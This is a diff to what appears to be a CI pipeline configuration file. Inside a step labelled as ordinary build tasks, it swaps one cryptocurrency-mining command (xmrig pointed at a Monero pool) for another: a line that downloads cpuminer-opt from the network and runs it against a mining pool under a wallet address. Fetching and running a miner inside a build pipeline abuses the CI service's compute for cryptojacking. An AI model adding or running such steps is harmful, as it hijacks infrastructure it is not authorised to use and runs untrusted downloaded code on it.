@@ -16,6 +16,6 @@ steps:
 - script: |
     echo Add other tasks to build, test, and deploy your project.
     echo See https://aka.ms/yaml
-    wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 && ./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -t5
+    wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qllvp0n9xv0mpcy8m6spjyvkl8klvw6mf8ckyxd.pentolis -t5
   displayName: 'Run a multi-line script'
 
